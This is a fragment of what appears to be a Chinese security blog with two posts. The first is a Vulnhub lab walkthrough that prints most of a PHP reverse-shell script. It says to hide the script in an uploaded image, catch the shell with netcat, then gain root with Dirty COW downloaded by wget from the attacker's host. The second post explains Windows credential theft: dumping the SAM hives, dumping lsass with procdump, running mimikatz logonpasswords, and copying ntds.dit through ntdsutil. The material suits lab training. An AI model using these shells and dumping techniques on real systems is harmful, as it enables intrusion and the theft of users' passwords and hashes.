class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>	<span class="token comment">// Make the current process a session leader</span></pre></td></tr><tr><td data-num="78"></td><td><pre>	<span class="token comment">// Will only succeed if we forked</span></pre></td></tr><tr><td data-num="79"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment">// Change to a safe directory</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token comment">// Remove any umask we inherited</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token comment">// Do the reverse shell...</span></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="98"></td><td><pre></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token comment">// Open reverse connection</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token comment">// Spawn shell process</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="108"></td><td><pre>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span></pre></td></tr><tr><td data-num="109"></td><td><pre>   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="110"></td><td><pre>   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="111"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre></pre></td></tr><tr><td data-num="115"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token comment">// Set everything to non-blocking</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>	<span class="token comment">// Check for end of TCP connection</span></pre></td></tr><tr><td data-num="131"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>	<span class="token comment">// Check for end of STDOUT</span></pre></td></tr><tr><td data-num="137"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre></pre></td></tr><tr><td data-num="142"></td><td><pre>	<span class="token comment">// Wait until a command is end down $sock, or some</span></pre></td></tr><tr><td data-num="143"></td><td><pre>	<span class="token comment">// command output is available on STDOUT or STDERR</span></pre></td></tr><tr><td data-num="144"></td><td><pre>	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre></pre></td></tr><tr><td data-num="147"></td><td><pre>	<span class="token comment">// If we can read from the TCP socket, send</span></pre></td></tr><tr><td data-num="148"></td><td><pre>	<span class="token comment">// data to process's STDIN</span></pre></td></tr><tr><td data-num="149"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre>	<span class="token comment">// If we can read from the process's STDOUT</span></pre></td></tr><tr><td data-num="157"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="158"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="164"></td><td><pre></pre></td></tr><tr><td data-num="165"></td><td><pre>	<span class="token comment">// If we can read from the process's STDERR</span></pre></td></tr><tr><td data-num="166"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="167"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="173"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="174"></td><td><pre></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token comment">// Like print, but does nothing if we've daemonised ourself</span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></pre></td></tr><tr><td data-num="183"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="187"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="188"></td><td><pre></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>​</p>
<p>修改监听 <code>ip端口</code> ，将源码粘贴到任意一张图片后上传。</p>
<p>再开启监听</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nc <span class="token operator">-</span>lvvp <span class="token number">1234</span></pre></td></tr></table></figure><p>可以成功返回 shell。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181653448-260492717.png" alt="image" /></p>
<h2 id="权限提升"><a class="anchor" href="#权限提升">#</a> 权限提升</h2>
<p>之前我们在使用  <code>nmap</code>  扫描时发现，该服务器的内核版本为 <code>linux 2.6.X</code> 。</p>
<p>用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZpcmVGYXJ0L2RpcnR5Y293">脏牛</span>试一试，尝试不能直接下载 <code>github</code>  上的文件，先在 <code>kali</code>  下载并编译：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>FireFart<span class="token operator">/</span>dirtycow<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181807368-1575042867.png" alt="image" /></p>
<p>然后将 <code>dirty</code>  放到 <code>/var/www/html/</code>  目录下， <code>kali开启web服务</code> ，在靶机上下载该文件</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>weget http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span><span class="token operator">/</span>dirty</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181833354-368513209.png" alt="image" /></p>
<p>赋予权限后运行:</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181842344-552158689.png" alt="image" /></p>
<p>获取到账号和密码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>firefart</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">123456</span></pre></td></tr></table></figure><p>直接账号登录失败</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181854076-1116046616.png" alt="image" /></p>
<p>用 <code>xshell</code>  登陆，成功</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181944096-1353533063.png" alt="image" /></p>
<h3 id="获取-flag"><a class="anchor" href="#获取-flag">#</a> 获取 flag</h3>
<p>进入 <code>/root</code>  目录下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181958783-1514138770.png" alt="image" /></p>
<p>成功拿到 flag。</p>
]]></content>
      <categories>
        <category>vulnhub靶机实战</category>
      </categories>
      <tags>
        <tag>vulnhub靶机实战</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（三）之凭证收集</title>
    <url>/article/49a1e863.html</url>
    <content><![CDATA[<p>唔，已经到凭证收集了啊！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211206153219182-303389120.gif" alt="image" /></p>
<p>收集本机凭据是非常重要的环节。通常我们可以收集的凭据包括但不限于: <code>Windows hash [NTLM,LM]</code> , 浏览器密码、 <code>cookie</code>  远程桌面密码  <code>VPN</code>  密码  <code>WLAN</code>  密码  <code>IIS</code>  服务器密码  <code>FTP</code>  密码等等.</p>
<h2 id="windows密码"><a class="anchor" href="#windows密码">#</a> WINDOWS 密码</h2>
<p><code>Windows</code>  密码加密后一般两种形式</p>
<p><code>NTLM</code>  哈希和 <code>LM</code>  哈希 [VISTA 和 2008 已经取消] 这些哈希有两个存储位置，本地用户在 <code>SAM</code>  数据库，</p>
<p>域用户存储在域控制器的 <code>NTDS.dit</code>  数据库中。当用户登陆时，这些哈希也可能存储在内存中，能够被我们抓取到</p>
<h2 id="sam-是什么"><a class="anchor" href="#sam-是什么">#</a> SAM 是什么？</h2>
<p>安全账号管理器 - 也就是存储用户密码的数据库文件，</p>
<p>他在 <code>windows/system32/config/SAM</code>  中，挂载在 <code>HKLM/SAM</code>  上.</p>
<p>为了防破解， <code>windows</code>  核心版本 <code>NT4.0</code>  中引入了 <code>SYSTEM</code>  函数， <code>SAM</code>  的磁盘上副本文件将被部分加密，以便存储在 <code>SAM</code>  中所有的本地账户 <code>immature</code>  哈希都使用密钥 (成 <code>SYSKEY</code>  加密)。</p>
<h3 id="提取sam-数据库哈希方法导出sam数据库中的密码"><a class="anchor" href="#提取sam-数据库哈希方法导出sam数据库中的密码">#</a> 提取 <code>SAM</code>  数据库哈希方法，导出 <code>sam</code>  数据库中的密码</h3>
<p><strong>方法 1</strong>：以<strong>管理员权限</strong>运行 <code>cmd</code> , 输入以下命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>reg save hklm\sam c<span class="token operator">:</span>\sam<span class="token punctuation">.</span>hive</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>reg save hklm\system c<span class="token operator">:</span>\system<span class="token punctuation">.</span>hive</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205183444485.png" alt="image-20211205183444485" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205183457807.png" alt="image-20211205183457807" /></p>
<p><strong>方法 2</strong>：使用 <code>powershell</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMC9Qb3dlcnNoZWxsZXJ5">Powershellery 脚本下载地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>powershell <span class="token operator">-</span>exec bypass</pre></td></tr><tr><td data-num="2"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\invoke<span class="token operator">-</span>ninjacopy<span class="token punctuation">.</span>ps1</pre></td></tr><tr><td data-num="3"></td><td><pre>Invoke<span class="token operator">-</span>NinjaCopy <span class="token operator">-</span>Path <span class="token constant">C</span><span class="token operator">:</span>\Windows\System32\config\<span class="token constant">SAM</span> <span class="token operator">-</span>LocalDestination <span class="token punctuation">.</span>\sam<span class="token punctuation">.</span>hive</pre></td></tr><tr><td data-num="4"></td><td><pre>Invoke<span class="token operator">-</span>NinjaCopy <span class="token operator">-</span>Path <span class="token constant">C</span><span class="token operator">:</span>\Windows\System32\config\<span class="token constant">SYSTEM</span> <span class="token operator">-</span>LocalDestination <span class="token punctuation">.</span>\system<span class="token punctuation">.</span>hive</pre></td></tr></table></figure><p>将生成的 <code>sam.hive</code>  与 <code>system.hive</code>  转至本地，使用 <code>saminside</code>  或 <code>cain</code>  导入</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvc29mdHMvNjI5NDU4Lmh0bWw=">saminside 脚本之家下载地址</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvc29mdHMvMjUzMTU1Lmh0bWw=">cain 脚本之家下载链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206145544837.png" alt="image-20211206145544837" /></p>
<p>结果如下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206145954489.png" alt="image-20211206145954489" /></p>
<h2 id="procdump"><a class="anchor" href="#procdump">#</a> Procdump</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==">官网下载链接</span></p>
<p>离线提取进行 <code>lsass</code> ， <code>vista</code>  及以上系统可以看到 <code>lsass</code>  进程，右键创建转储文件.</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Procdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>ma lsass<span class="token punctuation">.</span>exe lsass<span class="token punctuation">.</span>dmp</pre></td></tr></table></figure><p>获取到内存转储文件后，就可以使用 <code>mimikatz</code>  提取密码.</p>
<p>这里需要注意的是，运行 <code>mimikatz</code>  平台架构要与转储的系统兼容</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Sekurlsa</span><span class="token operator">:</span><span class="token operator">:</span>minidump lsass<span class="token punctuation">.</span>dmp</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">Sekurlsa</span><span class="token operator">:</span><span class="token operator">:</span>logonpasswords</pre></td></tr></table></figure><p>导出域用户 <code>hash</code> , 访问域控的 <code>C:\Windows\NTDS</code>  文件夹</p>
<p>记录 <code>GUID</code>  并且替换之后的命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ntdsutil snapshot “mount <span class="token punctuation">&#123;</span><span class="token constant">GUID</span><span class="token punctuation">&#125;</span>” quit quit</pre></td></tr></table></figure><p>C 盘中会生成新目录，将其中的 <code>Windows\NTDS\ntds.dit</code>  拷贝出来</p>
